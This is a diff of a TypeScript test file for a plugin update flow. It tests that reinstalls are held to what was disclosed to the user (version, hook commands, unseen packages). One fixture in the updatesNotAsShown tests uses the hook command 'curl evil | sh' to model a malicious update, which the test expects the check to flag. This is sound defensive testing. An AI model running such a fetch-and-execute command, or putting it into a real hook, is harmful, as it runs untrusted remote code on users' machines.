@@ -1,8 +1,9 @@
 /**
- * Tests for the all-packages update door's shared steps
- * ({@link applyInstalledUpdates}): one scan, a gate on every reinstall before
- * anything runs, and one refresh per reinstall that landed. The flow is faked;
- * the scan is real, over a temp dorkHome and one agent project.
+ * Tests for the all-packages update door's shared steps: one scan, a check
+ * that says what each new version runs ({@link checkInstalledUpdates}), and an
+ * apply that asks about exactly what would change and applies it held to that
+ * ({@link applyApprovedUpdates}). The flow is faked; the scan is real, over a
+ * temp dorkHome.
  */
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
@@ -10,11 +11,12 @@ import { tmpdir } from 'node:os';
 import path from 'node:path';
 import {
   applyApprovedUpdates,
-  applyInstalledUpdates,
   checkInstalledUpdates,
+  updatesNotAsShown,
+  type ApprovableUpdate,
   type InstalledUpdatesDeps,
-  type ReinstallGateInput,
 } from '../../flows/update-installed.js';
+import type { DisclosedEffects } from '../../disclosed-effects.js';
 import type { InstallationRecord } from '../../installed-scanner.js';
 
 /** Write a minimal plugin install at `root`. */
@@ -26,93 +28,22 @@ async function stage(root: string, name: string): Promise<void> {
   );
 }
 
-describe('applyInstalledUpdates', () => {
-  let dorkHome: string;
-  let agentPath: string;
-  let checkInstallations: ReturnType<typeof vi.fn>;
-  let onPluginsChanged: ReturnType<typeof vi.fn<InstalledUpdatesDeps['onPluginsChanged']>>;
-  let deps: InstalledUpdatesDeps;
-
-  beforeEach(async () => {
-    dorkHome = await mkdtemp(path.join(tmpdir(), 'update-installed-home-'));
-    agentPath = await mkdtemp(path.join(tmpdir(), 'update-installed-agent-'));
-    await stage(path.join(dorkHome, 'plugins', 'alpha'), 'alpha');
-    await stage(path.join(dorkHome, 'plugins', 'beta'), 'beta');
-    await stage(path.join(agentPath, '.dork', 'plugins', 'alpha'), 'alpha');
-    checkInstallations = vi.fn(async () => ({ checks: [] }));
-    onPluginsChanged = vi.fn<InstalledUpdatesDeps['onPluginsChanged']>();
-    deps = {
-      dorkHome,
-      listAgentScopes: () => [{ projectPath: agentPath, id: 'a', name: 'Alpha' }],
-      updateFlow: { checkInstallations } as unknown as InstalledUpdatesDeps['updateFlow'],
-      onPluginsChanged,
-    };
-  });
-
-  afterEach(async () => {
-    await rm(dorkHome, { recursive: true, force: true });
-    await rm(agentPath, { recursive: true, force: true });
-  });
-
-  it('asks the gate about every reinstall, and a later refusal stops the batch unrun', async () => {
-    // Purpose: permission is per reinstall. Stopping at the first ALLOWED one
-    // would let the rest run without ever being asked.
-    const asked: ReinstallGateInput[] = [];
-    const outcome = await applyInstalledUpdates(deps, {}, async (input) => {
-      asked.push(input);
-      return input.name === 'beta' ? 'no' : undefined;
-    });
-
-    expect(outcome).toEqual({ refused: 'no' });
-    expect(asked.map((i) => i.name)).toEqual(['alpha', 'beta']);
-    expect(checkInstallations).not.toHaveBeenCalled();
-  });
-
-  it('asks once per package and scope, then refreshes each landed reinstall in its own scope', async () => {
-    // Purpose: the gate and the refresh name the scope a reinstall touches —
-    // none for global, the agent's project for its copy — and a failed
-    // reinstall claims no change.
-    checkInstallations.mockResolvedValue({
-      checks: [
-        { packageName: 'alpha', scope: 'global', applied: { packageName: 'alpha' } },
-        { packageName: 'beta', scope: 'global', applyError: 'disk full' },
-        { packageName: 'alpha', scope: 'override', agentPath, applied: { packageName: 'alpha' } },
-      ],
-    });
-    const asked: ReinstallGateInput[] = [];
-
-    const outcome = await applyInstalledUpdates(deps, {}, async (input) => {
-      asked.push(input);
-      return undefined;
-    });
-
-    expect('result' in outcome).toBe(true);
-    expect(asked).toEqual([
-      { name: 'alpha' },
-      { name: 'beta' },
-      { name: 'alpha', projectPath: agentPath },
-    ]);
-    expect(checkInstallations).toHaveBeenCalledWith(expect.objectContaining({ apply: true }));
-    expect(onPluginsChanged.mock.calls.map(([ctx]) => ctx)).toEqual([
-      { projectPath: undefined, packageName: 'alpha', action: 'install' },
-      { projectPath: agentPath, packageName: 'alpha', action: 'install' },
-    ]);
-  });
-});
-
 describe('checkInstalledUpdates', () => {
   let dorkHome: string;
-  let checkInstallations: ReturnType<typeof vi.fn>;
+  let planInstallations: ReturnType<typeof vi.fn>;
   let deps: InstalledUpdatesDeps;
 
   beforeEach(async () => {
     dorkHome = await mkdtemp(path.join(tmpdir(), 'update-installed-check-'));
     await stage(path.join(dorkHome, 'plugins', 'alpha'), 'alpha');
     await stage(path.join(dorkHome, 'plugins', 'beta'), 'beta');
-    checkInstallations = vi.fn(async () => ({ checks: [] }));
+    planInstallations = vi.fn(async () => ({ checks: [{ packageName: 'beta' }], steps: [] }));
     deps = {
       dorkHome,
-      updateFlow: { checkInstallations } as unknown as InstalledUpdatesDeps['updateFlow'],
+      updateFlow: {
+        planInstallations,
+        applyPlan: vi.fn(),
+      } as unknown as InstalledUpdatesDeps['updateFlow'],
       onPluginsChanged: vi.fn(),
     };
   });
@@ -121,16 +52,20 @@ describe('checkInstalledUpdates', () => {
     await rm(dorkHome, { recursive: true, force: true });
   });
 
-  it('checks only the selected installations, advisory', async () => {
+  it('checks only the selected installations, and says what each new version runs', async () => {
     // Purpose: an advisory check of one package must not fetch every other
-    // package's marketplace, and must never apply.
-    await checkInstalledUpdates(deps, undefined, { names: ['beta'] });
+    // package's marketplace, and every check must carry the disclosure an
+    // apply is later held to (DOR-2306): a check that did not disclose would
+    // leave a confirm step nothing true to show.
+    const result = await checkInstalledUpdates(deps, undefined, { names: ['beta'] });
 
-    const [[req]] = checkInstallations.mock.calls as [
-      [{ installations: InstallationRecord[]; apply?: boolean }],
+    const [[req]] = planInstallations.mock.calls as [
+      [{ installations: InstallationRecord[]; disclose?: boolean }],
     ];
     expect(req.installations.map((r) => r.package.name)).toEqual(['beta']);
-    expect(req.apply).toBeUndefined();
+    expect(req.disclose).toBe(true);
+    // Only the checks leave the door: the plan's reinstall requests stay inside the flow.
+    expect(result).toEqual({ checks: [{ packageName: 'beta' }] });
   });
 
   it('refuses an unknown name before checking anything', async () => {
@@ -138,7 +73,7 @@ describe('checkInstalledUpdates', () => {
     await expect(checkInstalledUpdates(deps, undefined, { names: ['nope'] })).rejects.toThrow(
       'Package not installed: nope'
     );
-    expect(checkInstallations).not.toHaveBeenCalled();
+    expect(planInstallations).not.toHaveBeenCalled();
   });
 });
 
@@ -187,7 +122,6 @@ describe('applyApprovedUpdates', () => {
     deps = {
       dorkHome,
       updateFlow: {
-        checkInstallations: vi.fn(),
         planInstallations,
         applyPlan,
       } as unknown as InstalledUpdatesDeps['updateFlow'],
@@ -247,5 +181,60 @@ describe('applyApprovedUpdates', () => {
     expect(gate).not.toHaveBeenCalled();
     expect(applyPlan).not.toHaveBeenCalled();
     expect(outcome).toEqual({ result: { checks: [] } });
+  });
+});
+
+describe('updatesNotAsShown', () => {
+  const effects = (command: string): DisclosedEffects => ({
+    hooks: [{ event: 'Stop', matcher: null, command, source: null }],
+    schedules: [],
+    mcpServers: [],
+    lspServers: [],
+    monitors: [],
+    executables: [],
+    skillTools: [],
+  });
+  const update = (installPath: string, latestVersion: string, disclosed: DisclosedEffects | null) =>
+    ({
+      packageName: 'alpha',
+      installPath,
+      type: 'plugin',
+      scope: 'global',
+      installedVersion: '1.0.0',
+      latestVersion,
+      disclosed,
+    }) satisfies ApprovableUpdate;
+
+  it('passes a reinstall that is exactly what was shown, JSON round trip included', () => {
+    // Purpose: the app sends back the disclosure it received over JSON; the
+    // comparison must not refuse a faithful echo, or no one could ever update.
+    const shown = update('/p/a', '2.0.0', effects('echo hi'));
+    const echoed = JSON.parse(JSON.stringify(shown)) as typeof shown;
+    expect(updatesNotAsShown([shown], [echoed])).toEqual([]);
+  });
+
+  it('flags a reinstall whose new version now runs something else', () => {
+    // Purpose: the exploit. A source that adds `curl | sh` between the check
+    // and the apply must be caught before anything is reinstalled.
+    const now = update('/p/a', '2.0.0', effects('curl evil | sh'));
+    const shown = update('/p/a', '2.0.0', effects('echo hi'));
+    expect(updatesNotAsShown([now], [shown])).toEqual([now]);
+  });
+
+  it('flags a reinstall of another version than the one shown', () => {
+    // Purpose: the person agreed to 2.0.0; a 3.0.0 that happens to run the same
+    // programs is still not what they were shown.
+    const now = update('/p/a', '3.0.0', effects('echo hi'));
+    expect(updatesNotAsShown([now], [update('/p/a', '2.0.0', effects('echo hi'))])).toEqual([now]);
+  });
+
+  it('flags a reinstall the caller was never shown, and absence is not the same as nothing', () => {
+    // Purpose: an installation missing from what was shown is not approved,
+    // and "nothing previewed" (null) never stands in for a package that runs things.
+    const unseen = update('/p/b', '2.0.0', null);
+    const shownNull = update('/p/a', '2.0.0', null);
+    const now = update('/p/a', '2.0.0', effects('echo hi'));
+    expect(updatesNotAsShown([unseen], [shownNull])).toEqual([unseen]);
+    expect(updatesNotAsShown([now], [shownNull])).toEqual([now]);
   });
 });
